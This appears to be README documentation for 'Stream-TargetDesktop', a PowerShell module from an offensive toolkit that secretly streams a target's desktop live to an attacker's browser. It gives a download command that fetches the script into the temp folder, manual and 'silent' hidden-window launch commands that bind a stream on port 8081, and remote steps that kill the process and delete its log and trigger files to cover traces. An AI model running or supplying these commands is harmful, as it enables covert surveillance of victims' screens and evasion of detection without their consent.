## Stream-TargetDesktop.ps1

|Function name|Description|Privileges|Notes|
|---|---|---|---|
|[Stream-TargetDesktop](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Stream-TargetDesktop/Stream-TargetDesktop.ps1)|Stream target desktop live|User Land|Dependencies: firefox browser with MJPEG inatalled (attacker PC)|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Stream-TargetDesktop/Stream-TargetDesktop.ps1" -OutFile "$Env:TMP\Stream-TargetDesktop.ps1"
```

<br />

**prerequesites:**
```powershell
#Make sure Firefox ( with MJPEG ) its installed on attacker machine
[bool](Get-ItemProperty -Path "HKLM:\SOFTWARE\Mozilla\Mozilla Firefox" -EA SilentlyContinue)
```

<br />

**execute:**
```powershell
[demo] #Manual execution
Import-Module -Name "$Env:TMP\Stream-TargetDesktop.ps1" -Force;TargetScreen -Bind -Port 8081

[demo] #Access live stream (attacker pc)
Start firefox on: "http://${RemoteHost}:8081" #Rhost = target ip addr


#Automatic execution (silent)
Start-Process -WindowStyle hidden powershell -ArgumentList "Import-Module -Name `"$Env:TMP\Stream-TargetDesktop.ps1`" -Force;TargetScreen -Bind -Port 8081";exit

#Access live stream (attacker pc)
Start firefox on: "http://${RemoteHost}:8081" #Rhost = target ip addr


#Stop stream (remote)
$StreamPid = Get-Content -Path "$Env:TMP\mypid.log" -EA SilentlyContinue|?{ $_ -ne '' }
Stop-Process -id $StreamPid -EA SilentlyContinue -Force

#CleanUp (remote)
Remove-Item -Path "$Env:TMP\trigger.ps1" -Force
Remove-Item -Path "$Env:TMP\mypid.log" -Force
```
